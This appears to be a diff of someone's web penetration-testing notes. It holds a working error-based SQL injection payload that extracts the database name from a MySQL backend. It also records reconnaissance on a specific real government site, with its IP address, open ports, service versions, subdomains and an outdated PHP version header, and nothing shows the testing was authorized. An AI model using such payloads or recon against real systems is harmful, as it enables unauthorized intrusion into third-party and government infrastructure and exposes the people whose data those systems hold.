@@ -9,3 +9,27 @@ You have an error in your SQL syntax; check the manual that corresponds to your 
 
 '+AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)--
 
+
+
+
+Target = https://dgip.gov.pk/home/
+
+04 October 2023
+14:29
+
+PORT     STATE SERVICE   VERSION
+80/tcp   open  http      Apache httpd
+110/tcp  open  pop3?
+143/tcp  open  imap?
+443/tcp  open  ssl/http  Apache httpd
+1720/tcp open  h323q931?
+
+clientfeedback.dgip.gov.pk
+complaint.dgip.gov.pk
+IP = 175.107.60.195
+
+X-Powered-By: PHP/5.6.27
+
+Location: contact-form-thank-you.php?found=N
+
+
